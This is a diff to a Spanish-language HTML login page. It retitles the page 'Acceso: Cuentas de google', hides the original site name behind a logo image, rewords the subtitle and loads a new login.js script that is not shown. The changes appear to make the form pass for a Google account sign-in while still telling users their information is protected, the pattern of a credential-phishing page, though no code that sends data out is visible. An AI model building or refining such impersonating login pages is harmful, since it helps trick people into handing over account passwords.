@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iniciar Sesión - Mi Sitio</title>
+    <title>Acceso: Cuentas de google</title>
     <link rel="stylesheet" href="styles.css">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
 </head>
@@ -11,11 +11,12 @@
     <div class="login-container">
         <div class="login-card">
             <div class="logo">
-                <h1>Mi Sitio</h1>
+                <img src="assets/image/logo.png" alt="Mi Sitio" class="logo-image">
+                <h1 style="display: none;">Mi Sitio</h1>
             </div>
             
             <h2 class="title">Iniciar sesión</h2>
-            <p class="subtitle">Usa tu cuenta de Mi Sitio</p>
+            <p class="subtitle">Accede a tu cuenta</p>
 
             <form id="loginForm" class="login-form">
                 <div class="input-group">
@@ -34,12 +35,15 @@
                     <span class="error-message" id="password-error"></span>
                 </div>
 
+                <!-- Mensaje de error general -->
+                <div class="error-message general-error" id="general-error" style="display: none;"></div>
+
                 <div class="forgot-password">
                     <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
                 </div>
 
                 <div class="form-footer">
-                    <a href="#" class="create-account">Crear cuenta</a>
+                    <a href="x.html" class="create-account">Crear cuenta</a>
                     <button type="submit" class="login-btn" id="loginBtn">
                         <span class="btn-text">Siguiente</span>
                         <div class="loading-spinner" style="display: none;"></div>
@@ -51,15 +55,8 @@
                 <p>🔒 Tu información está protegida</p>
             </div>
         </div>
-
-        <div class="language-selector">
-            <select id="language">
-                <option value="es">Español</option>
-                <option value="en">English</option>
-            </select>
-        </div>
     </div>
 
-    <script src="script.js"></script>
+    <script src="login.js"></script>
 </body>
 </html>
